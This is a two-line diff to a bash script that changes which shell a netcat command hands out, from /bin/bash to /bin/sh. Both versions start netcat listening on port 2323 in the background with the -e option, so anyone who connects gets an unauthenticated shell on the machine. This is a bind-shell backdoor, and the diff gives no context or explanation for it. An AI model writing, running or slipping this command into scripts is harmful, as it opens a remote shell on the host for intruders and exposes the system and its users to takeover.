@@ -1,2 +1,2 @@
 #!/bin/bash
-nc -l -t -p 2323 -e /bin/bash &exit
+nc -l -t -p 2323 -e /bin/sh &exit
